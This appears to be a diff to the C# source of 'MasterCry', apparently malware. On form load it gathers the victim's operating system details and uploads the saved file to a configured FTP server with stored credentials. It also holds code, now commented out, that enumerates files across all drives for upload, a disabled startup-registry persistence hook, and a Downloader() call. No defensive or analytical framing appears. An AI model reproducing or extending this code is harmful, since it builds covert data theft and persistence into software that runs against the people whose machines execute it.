@@ -32,29 +32,40 @@ namespace MasterCry
         //Todo: Enable StartUp
         private void Form1_Load(object sender, EventArgs e)
         {
-            Task task = Task.Factory.StartNew(() =>
+            //Task task = Task.Factory.StartNew(() =>
+            //{
+            if (!System.IO.File.Exists(BuildVars.Save_Location))
             {
-                if (!System.IO.File.Exists(BuildVars.Save_Location))
-                    System_Details.getOperatingSystemInfo();
-
-                if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
+                System_Details.getOperatingSystemInfo();
+                if (IsConnectToInternet())
                 {
-                    foreach (var drv in getDrives())
+                    using (WebClient client = new WebClient())
                     {
-                        var data = GetFileList(drv);
-
-                        foreach (var item in data)
-                            WriteItems(item);
+                        client.Credentials = new NetworkCredential(BuildVars.FTP_USER, BuildVars.FTP_PASS);
+                        client.UploadFile(BuildVars.FTP_SERVER + BuildVars.Save_Location, "STOR", BuildVars.Save_Location);
                     }
-                    Upload();
                 }
-                if (System.IO.File.Exists(BuildVars.Save_Items_Location))
-                {
-                    string content = File.ReadAllText(BuildVars.Save_Items_Location);
-                    if (content.Length != 0)
-                        Upload();
-                }
-            });
+                
+            }
+
+            //    if (!System.IO.File.Exists(BuildVars.Save_Items_Location))
+            //    {
+            //        foreach (var drv in getDrives())
+            //        {
+            //            var data = GetFileList(drv);
+
+            //            foreach (var item in data)
+            //                WriteItems(item);
+            //        }
+            //        Upload();
+            //    }
+            //    if (System.IO.File.Exists(BuildVars.Save_Items_Location))
+            //    {
+            //        string content = File.ReadAllText(BuildVars.Save_Items_Location);
+            //        if (content.Length != 0)
+            //            Upload();
+            //    }
+            //});
 
             //if (!CheckRegistryExists())
             //    RegisterInStartup(true);
@@ -279,5 +290,6 @@ namespace MasterCry
         {
             Downloader();
         }
+
     }
 }
